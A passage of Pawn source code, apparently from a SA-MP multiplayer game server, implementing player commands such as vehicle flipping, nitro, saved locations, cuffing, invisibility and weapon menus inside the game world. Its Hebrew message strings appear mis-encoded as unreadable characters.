				CreateExplosionVW(p[0]+5.0,p[1],p[2],12,7.5,vw);
				CreateExplosionVW(p[0]+10.0,p[1],p[2],12,7.5,vw);
				CreateExplosionVW(p[0],p[1]+5.0,p[2],12,7.5,vw);
				CreateExplosionVW(p[0],p[1]+10.0,p[2],12,7.5,vw);
				CreateExplosionVW(p[0]+5.0,p[1]+10.0,p[2],12,7.5,vw);
				CreateExplosionVW(p[0]+10.0,p[1]+5.0,p[2],12,7.5,vw);
				CreateExplosionVW(p[0]-5.0,p[1],p[2],12,7.5,vw);
				CreateExplosionVW(p[0]-10.0,p[1],p[2],12,7.5,vw);
				CreateExplosionVW(p[0],p[1]-5.0,p[2],12,7.5,vw);
				CreateExplosionVW(p[0],p[1]-10.0,p[2],12,7.5,vw);
				CreateExplosionVW(p[0]-5.0,p[1]-10.0,p[2],12,7.5,vw);
				CreateExplosionVW(p[0]-10.0,p[1]-5.0,p[2],12,7.5,vw);
			}
			SetPlayerHealth(playerid,100.0);
		}
		if(equal(cmd,"/flip"))
		{
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс сыущ ьфЇхъ рх·х");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сЇЄщьх·");
			if(!IsVehicleUpsideDown(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid,red," .щ∙ ьф∙·ю∙ с°ыс сЇўхуф цх °ў ыр∙° ф°ыс фЇхъ");
			new Float:za;
			GetVehicleZAngle(GetPlayerVehicleID(playerid),za);
			SetVehicleZAngle(GetPlayerVehicleID(playerid),za);
			SendClientMessage(playerid,green," .ф°ыс ∙ьъ ф·фЇъ");
			PlaySound(playerid,1133);
		}
		if(equal(cmd,"/flix"))
		{
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс сыущ ь·ўя рх·х");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф срцх° ущ-рэ");
			if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх сюЁхє");
			if(IsPlayerInHQ(playerid)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх сюЇўух· ўьрЁщэ");
			if(!IsPlayerMAdmin(playerid) && CheckIfCommandUsed(playerid,8,true)) return 1;
			new lvl = lcmdid("/flix",1), v = GetPlayerVehicleID(playerid), Float:za;
			if(playerinfo[playerid][upgradecmd][lvl] == 2) RepairVehicle(v);
			SetVehicleHealth(v,GetVehicleMHealth(GetVehicleModel(v)));
			GetVehicleZAngle(v,za);
			SetVehicleZAngle(v,za);
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,v))
			{
				PlaySound(i,1133);
				SendClientMessage(i,green," .ф°ыс ∙ьъ ·хўя");
			}
		}
		if(equal(cmd,"/nitro"))
		{
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .ь∙щюх∙ сЇўхуф цх Єьщъ ьфщх· с°ыс");
			if(GetVehicleType(GetPlayerVehicleID(playerid)) != 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфхёщє ∙щЇх° ь°ыс сх р·ф ЁюЎр");
			if(GetVehicleComponentInSlot(GetPlayerVehicleID(playerid),5) >= 1008 && GetVehicleComponentInSlot(GetPlayerVehicleID(playerid),5) <= 1010) return SendClientMessage(playerid,red," .ыс° щ∙ ьъ Ёщш°х с°ыс");
			/*if(GetMoney(playerid) < 2000) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, ∙щюх∙ сЇўхуф цх Єхьф 2000$");
			GiveMoney(playerid,0-2000, 17);*/
			new nitroid = playerinfo[playerid][upgradecmd][lcmdid("/nitro",1)] + 1007;
			AddVehicleComponent(GetPlayerVehicleID(playerid),nitroid,playerid);
			GameTextForPlayer(playerid,"~r~nitro ~y~added!",2000,5);
		}
		if(equal(cmd,"/hyd"))
		{
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .ь∙щюх∙ сЇўхуф цх Єьщъ ьфщх· с°ыс");
			if(GetVehicleType(GetPlayerVehicleID(playerid)) != 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфхёщє ∙щЇх° ь°ыс сх р·ф ЁюЎр");
			if(GetVehicleComponentInSlot(GetPlayerVehicleID(playerid),9) == 1087) return SendClientMessage(playerid,red," .ыс° щ∙ ьъ фщу°хьщўф с°ыс");
			/*if(GetMoney(playerid) < 2000) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, ∙щюх∙ сЇўхуф цх Єхьф 2000$");
			GiveMoney(playerid,0-2000);*/
			AddVehicleComponent(GetPlayerVehicleID(playerid),1087,playerid);
			GameTextForPlayer(playerid,"~r~hydraulics ~y~added!",2000,5);
		}
		if(equal(cmd,"/loc") || equal(cmd,"/pos"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /loc [save/goto/reset] :Ўх°· ф∙щюх∙");
			new _cl = playerinfo[playerid][upgradecmd][lcmdid("/loc",1)];
			if(equal(cmd,"save"))
			{
				if(playerinfo[playerid][mark2][2]) return SendClientMessage(playerid,red," .ыс° щ∙ ьъ ющўхэ ∙юх°");
				if((GetPlayerInterior(playerid) != 0 || GetPlayerVirtualWorld(playerid) != world_normal) && !IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх сющўхюъ фЁхычщ");
				if(IsPlayerInHQ(playerid)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх сюЇўух· ўьрЁщэ");
				if(IsPlayerDead(playerid)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф фцх ы∙р·ф ю·");
				if(playerinfo[playerid][castle] != -1) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх сшщ°х·");
				new Float:p[3];
				//if(GetMoney(playerid) < 5000) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, ∙щюх∙ сЇўхуф фцх Єхьф 5000$");
				//GiveMoney(playerid,0-5000);
				GetPlayerPos(playerid,p[0],p[1],p[2]);
				for(new i=0;i<3;i++) playerinfo[playerid][mark][i] = p[i];
				playerinfo[playerid][mark2][0] = GetPlayerInterior(playerid);
				playerinfo[playerid][mark2][1] = GetPlayerVirtualWorld(playerid);
				playerinfo[playerid][mark2][2] = 1;
				SetPlayerMapIcon(playerid,icon_player,p[0],p[1],p[2],35,0);
				PlaySound(playerid,1057);
				SendClientMessage(playerid,green," .фющўхэ Ё∙ю°");
				if(_cl >= 2)
				{
					fsetfloat(fuser(playerid),"SavedX",p[0]);
					fsetfloat(fuser(playerid),"SavedY",p[1]);
					fsetfloat(fuser(playerid),"SavedZ",p[2]);
				}
				else if(!playerinfo[playerid][noticedmsg][5] && _cl < 2)
				{
					SendClientMessage(playerid,grey," /lcmds :юф·Ї°щш фср /loc °хЎф ∙фющўхэ ∙ьъ щ∙ю° тэ рч°щ ∙·Ўр юф∙°·? ∙у°т р· фЇўхуф");
					playerinfo[playerid][noticedmsg][5] = 1;
				}
			}
			else if(equal(cmd,"goto"))
			{
				if(!playerinfo[playerid][mark2][2]) return SendClientMessage(playerid,red," .рщя ьъ ющўхэ ∙юх°");
				//if(GetMoney(playerid) < 3000) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, ∙щюх∙ сЇўхуф фцх Єхьф 3000$");
				if(!CanBeTeleported(playerid)) return 1;
				// was 50, 40;
				if(DistanceToPoint(playerinfo[playerid][mark][0],playerinfo[playerid][mark][1],playerinfo[playerid][mark][2],815.9630,-1101.8781,25.7905) < 100) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙·т° ьющўхэ рьщх °Ўщ· ьф∙·т° Єўс ЁщЎхь срт"), 1;
				if(DistanceToPoint(playerinfo[playerid][mark][0],playerinfo[playerid][mark][1],playerinfo[playerid][mark][2],2003.6223,1543.9602,13.5908) < 100) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙·т° ьющўхэ рьщх °Ўщ· ьф∙·т° Єўс ЁщЎхь срт"), 1;
				if(IsPlayerInAnyVehicle(playerid) && vehicleinfo[GetPlayerVehicleID(playerid)][store] && playerinfo[playerid][vehicle][1] != GetPlayerVehicleID(playerid)) return SendClientMessage(playerid,red," .рщЁъ щыхь ь∙т° °ыс ючЁх· фюыхЁщх· ∙ьр ∙щщъ ьъ");
				//GiveMoney(playerid,0-3000);
				switch(GetPlayerState(playerid))
				{
					case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER: SetPlayerPos(playerid,playerinfo[playerid][mark][0],playerinfo[playerid][mark][1],playerinfo[playerid][mark][2]);
					case PLAYER_STATE_DRIVER:
					{
						SetVehiclePos(GetPlayerVehicleID(playerid),playerinfo[playerid][mark][0],playerinfo[playerid][mark][1],playerinfo[playerid][mark][2],playerid);
						LinkVehicleToInterior(GetPlayerVehicleID(playerid),playerinfo[playerid][mark2][0]);
						SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),playerinfo[playerid][mark2][1]);
					}
				}
				SetCameraBehindPlayer(playerid);
				SetPlayerInterior(playerid,playerinfo[playerid][mark2][0]);
				SetPlayerVirtualWorld(playerid,playerinfo[playerid][mark2][1]);
				PlaySound(playerid,1057);
				SendClientMessage(playerid,green," .∙хт°· рь фющўхэ ф∙юх° ∙ьъ");
			}
			else if(equal(cmd,"reset"))
			{
				if(!playerinfo[playerid][mark2][2]) return SendClientMessage(playerid,red," .рщя ьъ ющўхэ ∙юх°");
				for(new i=0;i<3;i++) playerinfo[playerid][mark][i] = 0.0;
				playerinfo[playerid][mark2] = {0,world_normal,0};
				RemovePlayerMapIcon(playerid,icon_player);
				PlaySound(playerid,1057);
				if(_cl >= 2)
				{
					fsetfloat(fuser(playerid),"SavedX",0.0);
					fsetfloat(fuser(playerid),"SavedY",0.0);
					fsetfloat(fuser(playerid),"SavedZ",0.0);
				}
				SendClientMessage(playerid,green," .фющўхэ ф∙юх° ∙ьъ фхё°");
			}
			else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
			return 1;
		}
		if(equal(cmd,"/pump"))
		{
			if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх сющўхюъ фЁхычщ");
			if(!CanUseCommand(playerid)) return 1;
			new id, string[M_S], Float:p[3];
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /pump [id/name] :Ўх°· ф∙щюх∙");
			id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id) || GetPlayerInterior(id) != 0 || GetPlayerCheckpoint(id) != cp_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх Єь ю∙·ю∙ цф");
			GetPlayerPos(id,p[0],p[1],p[2]);
			if(playerid == id) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьсЎЄ р· фЇўхуф фцх Єь ЄЎюъ");
			if(GetPlayerDistanceToPointEx(playerid,p[0],p[1],p[2]) > (5.0 * playerinfo[playerid][upgradecmd][lcmdid("/pump",1)])) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ў°хс рь ф∙чўя ююЁх с°ЎхЁъ ь∙рхс чщщэ");
			if(GetPlayerState(id) != PLAYER_STATE_ONFOOT) return SendClientMessage(playerid,red," .Єь ф∙чўя ьфщх· фхьъ °ть");
			if(playerinfo[id][gm]) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьсЎЄ р· фЇЄхьф фцх Єь ю∙·ю∙ цф");
			if(GetPlayerHQ(playerid) != 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх сюЇўух· ўьрЁщэ");
            if(!IsPlayerInStore(playerid,store_none)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цр· сющўхэ ∙ьъ");
			playerinfo[playerid][pump] = id;
			format(string,sizeof(string)," !%s р·ф ∙хрс ыЄ· р· фчщщэ ∙ь",GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," !ф·чщь ь∙рхс р· фчщщэ ∙ьъ %s",GetName(playerid));
			SendClientMessage(id,red,string);
		}
		if(equal(cmd,"/cuff"))
		{
			if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх сющўхюъ фЁхычщ");
			if(!CanUseCommand(playerid)) return 1;
			new id, string[M_S], Float:p[3];
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /cuff [id/name] :Ўх°· ф∙щюх∙");
			id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			GetPlayerPos(id,p[0],p[1],p[2]);
			if(playerid == id) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьсЎЄ р· фЇўхуф фцх Єь ЄЎюъ");
			if(GetPlayerDistanceToPointEx(playerid,p[0],p[1],p[2]) > 8.0) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ў°хс рь ф∙чўя");
			if(GetPlayerState(id) != PLAYER_STATE_ONFOOT || GetPlayerSpecialAction(id) != SPECIAL_ACTION_NONE || playerinfo[id][frozen][0]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх Єь ф∙чўя фцф сюЎсх фЁхычщ");
			if(GetPlayerHQ(playerid) != 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх сюЇўух· ўьрЁщэ");
			SetPlayerSpecialAction(id,SPECIAL_ACTION_CUFFED);
			playerinfo[id][removespac] = 8;
			format(string,sizeof(string)," !%s-∙ю· рцщўщэ ь",GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," !∙э ьъ рцщўщэ %s",GetName(playerid));
			SendClientMessage(id,green,string);
		}
		if(equal(cmd,"/invisible") || equal(cmd,"/vis"))
		{
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф срцх° ущ-рэ");
			new u = playerinfo[playerid][upgradecmd][lcmdid("/invisible",1)];
			if(playerinfo[playerid][invisible])
			{
				for(new i=0;i<MAX_PLAYERS_;i++)
				{
					if(!IsPlayerConnected(i)) continue;
					ShowPlayerNameTagForPlayer(i,playerid,0);
					SetPlayerMarkerForPlayer(i,playerid,GetColor(playerid,PLAYER_ALPHA));
				}
				playerinfo[playerid][invisible] = 0;
				SendClientMessage(playerid,green," .ыЄ· р·ф Ё°рф");
			}
			else
			{
				for(new i=0;i<MAX_PLAYERS_;i++)
				{
					if(!IsPlayerConnected(i)) continue;
					ShowPlayerNameTagForPlayer(i,playerid,0);
					SetPlayerMarkerForPlayer(i,playerid,GetColor(playerid,45 - (15 * u)));
				}
				playerinfo[playerid][invisible] = 1;
				SendClientMessage(playerid,green," .ыЄ· р·ф сь·щ Ё°рф");
			}
		}
		if(equal(cmd,"/ghost"))
		{
			if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфыЁё ьЄхьэ ф°хчх· ыр∙° р·ф с°ыс");
			if(!CanUseCommand(playerid)) return 1;
			if(GetPlayerHQ(playerid) != 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх сюЇўух· ўьрЁщэ");
			if(GetPlayerVirtualWorld(playerid) != world_normal && GetPlayerVirtualWorld(playerid) != world_ghosts) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх сюЎсъ фЁхычщ");
			if(GetPlayerVirtualWorld(playerid) == world_ghosts)
			{
				SendClientMessage(playerid,blue," .щЎр· юЄхьэ ф°хчх·");
				SetPlayerVirtualWorld(playerid,world_normal);
			}
			else
			{
				SendClientMessage(playerid,blue," .с°хъ фср ьЄхьэ ф°хчх·: ыря, °ў ∙чўЁщэ сюЎс °хч щыхьщэ ь°рх· рх·ъ");
				SetPlayerVirtualWorld(playerid,world_ghosts);
			}
		}
		if(equal(cmd,"/invscan"))
		{
			new lvl = playerinfo[playerid][upgradecmd][lcmdid("/invscan",1)], Float:scanDistance = float(30 * lvl), found[MAX_PLAYERS] = {-1,...}, founds = 0, string[M_S], Float:p[3];
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][invisible] && IsPlayerInCircle(i,p[0],p[1],scanDistance) && i != playerid) found[founds++] = i;
			if(!founds) return SendClientMessage(playerid,red," .ьр ЁюЎрх ∙чўЁщэ юхё·°щэ срцх° цф");
			format(string,sizeof(string)," ~~~ :∙чўЁщэ юхё·°щэ ∙ЁюЎрх - %d ~~~",founds);
			SendClientMessage(playerid,lightblue,string);
			for(new i = 0; i < founds; i++)
			{
				format(string,sizeof(string)," Х %02d. %s (ID: %03d || Distance: %.2f)",i + 1,GetName(found[i]),found[i],GetDistanceBetweenPlayers(playerid,found[i]));
				SendClientMessage(playerid,yellow,string);
				SetPlayerMarkerForPlayer(playerid,found[i],0x009900FF);
				SetTimerEx("HideMarkers",1500 * lvl,0,"ii",playerid,found[i]);
			}
		}
		/*if(equal(cmd,"/jetp"))
		{
			if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK) return SendClientMessage(playerid,red," .р·ф ыс° ю∙·ю∙ с·щў ёщьхя");
			if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхї ь°ыс");
			if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх сющўхюъ фЁхычщ");
			if(!CanUseCommand(playerid)) return 1;
			GiveJetpack(playerid);
			GameTextForPlayer(playerid,"~b~~h~fly ~h~like ~h~a ~h~bird~h~!",3000,4);
		}*/
		if(equal(cmd,"/raise"))
		{
		    if(GetPlayerCheckpoint(playerid) == cp_vstore) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх сющўхюъ фЁхычщ");
			if(GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_USEJETPACK) return SendClientMessage(playerid,red," .Єьщъ ьфчцщў ·щў ёщьхя");
			if(playerinfo[playerid][raise] != INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .р·ф ыс° ючцщў ∙чўя рч°");
			if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх сющўхюъ фЁхычщ");
			if(!CanUseCommand(playerid)) return 1;
			if(IsPlayerInHQ(playerid)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх сюЇўух· ўьрЁщэ");
			new id, string[M_S], Float:p[3];
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /raise [id/name] :Ўх°· ф∙щюх∙");
			id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id) || GetPlayerInterior(id) != 0 || GetPlayerCheckpoint(id) != cp_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх Єь ю∙·ю∙ цф");
			GetPlayerPos(id,p[0],p[1],p[2]);
			if(GetPlayerDistanceToPointEx(playerid,p[0],p[1],p[2]) > 5.0 || GetPlayerInterior(playerid) != GetPlayerInterior(id) || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ў°хс рь ф∙чўя ьх с°ЎхЁъ ьфчцщў");
			if(playerid == id) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьсЎЄ р· фЇўхуф фцх Єь ЄЎюъ");
			if(GetPlayerState(id) != PLAYER_STATE_ONFOOT) return SendClientMessage(playerid,red," .Єь ф∙чўя ьфщх· фхьъ °ть");
			playerinfo[playerid][raise] = id;
			format(string,sizeof(string)," /sraise :ьфЇёўф !%s ф°ю· Єэ ф·щў ёщьхя ∙ьъ р·",GetName(id));
			SendClientMessage(playerid,red,string);
			format(string,sizeof(string)," !ф·чщь ьф°щэ рх·ъ Єэ ф·щў ёщьхя ∙ьх! ьчї 10 ЇЄющэ Єь юў∙ ф°щЎф ыущ ьф·Ёту %s",GetName(playerid));
			SendClientMessage(id,green,string);
			playerinfo[id][raisef] = 0, playerinfo[id][raiseby] = playerid;
		}
		if(equal(cmd,"/sraise"))
		{
			if(playerinfo[playerid][raise] == INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .р·ф ьр ючцщў ∙хэ ∙чўя");
			StopRaise(playerid);
		}
		if(equal(cmd,"/twist"))
		{
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс сыущ ьф∙·ю∙ сЇўхуф фцх");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф срцх° ущ-рэ");
			if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх сюЁхє");
			if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red," .р·ф ьр фЁфт");
			if(IsPlayerInHQ(playerid)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх сюЇўух· ўьрЁщэ");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /twist [1-3] :Ўх°· ф∙щюх∙");
			switch(strval(cmd))
			{
				case 1: SetVehicleAngularVelocity(GetPlayerVehicleID(playerid),0.4,0.0,0.0);
				case 2: SetVehicleAngularVelocity(GetPlayerVehicleID(playerid),0.0,0.4,0.0);
				case 3: SetVehicleAngularVelocity(GetPlayerVehicleID(playerid),0.0,0.0,0.5);
			}
		}
		if(equal(cmd,"/jumping"))
		{
			if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendClientMessage(playerid,red," .Єьщъ ьфщх· фхьъ °ть");
			if(!CanUseCommand(playerid)) return 1;
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сюЎс");
			if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх сющўхюъ фЁхычщ");
			new Float:dist = floatmul(0.3,float(lcmdid("/jumping",1)));
			SetPlayerForwardVelocity(playerid,dist,floatdiv(dist,0.3));
		}
		if(equal(cmd,"/turbo"))
		{
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс сыущ ьф∙·ю∙ сЇўхуф фцх");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф срцх° ущ-рэ");
			if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх сюЁхє");
			if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red," .р·ф ьр фЁфт");
			if(IsPlayerInHQ(playerid)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх сюЇўух· ўьрЁщэ");
			if(CheckIfCommandUsed(playerid,9,true)) return 1;
			new Float:p[4], v = GetPlayerVehicleID(playerid), Float:vh;
			GetVehicleHealth(v,vh);
			SetVehicleForwardVelocity(v,3.0,0.0);
			GetVehiclePos(v,p[0],p[1],p[2]);
			GetVehicleZAngle(v,p[3]);
			GetXYInFrontOfPoint(p[0],p[1],p[3],-12.0);
			CreateExplosionVW(p[0],p[1],p[2],6,0.3,GetPlayerVirtualWorld(playerid));
			SetVehicleHealth(v,vh);
		}
		if(equal(cmd,"/melee"))
		{
			if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendClientMessage(playerid,red," .Єьщъ ьфщх· фхьъ °ть");
			if(!CanUseCommand(playerid)) return 1;
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сюЎс");
			if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх сющўхюъ фЁхычщ");
			new tl = GetPlayerTeleportArea(playerid), dia[M_S];
			if(tl > -1 && Teleports[tl][Tnoshooting]) return SendClientMessage(playerid,red," .рёх° ьф∙·ю∙ сЁ∙ўщэ с∙щтх° фцф");
			for(new i = 1, m = (lcmdid("/melee",1)*5)+1; i < m; i++) format(dia,sizeof(dia),i == 1 ? ("%s%s") : ("%s\n%s"),dia,WeaponName(i));
			ShowPlayerDialog(playerid,dialog_cmdmelee,DIALOG_STYLE_LIST,@c(lightblue) "Ё∙ўщ ф·ўЇф юў°хс",dia,"ўсь","сщшхь");
		}
		if(equal(cmd,"/gun"))
		{
			if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendClientMessage(playerid,red," .Єьщъ ьфщх· фхьъ °ть");
			if(!CanUseCommand(playerid)) return 1;
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сюЎс");
			if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх сющўхюъ фЁхычщ");
			new tl = GetPlayerTeleportArea(playerid), dia[M_S*4], mx = lcmdid("/gun",1);
			if(tl > -1 && Teleports[tl][Tnoshooting]) return SendClientMessage(playerid,red," .рёх° ьф∙·ю∙ сЁ∙ўщэ с∙щтх° фцф");
			for(new i = 0; i < sizeof(Ammunation); i++) if(Ammunation[i][aSlot] < mx) format(dia,sizeof(dia),"%s%s%s",dia,!strlen(dia) ? ("") : ("\n"),GetWeaponAmmunationColor(Ammunation[i][aSlot]),Ammunation[i][aName]);
			ShowPlayerDialog(playerid,dialog_cmdgun,DIALOG_STYLE_LIST,@c(lightblue) "Ё∙ўщ ф·ўЇф ю°чхў",dia,"ўсь","сщшхь");
		}
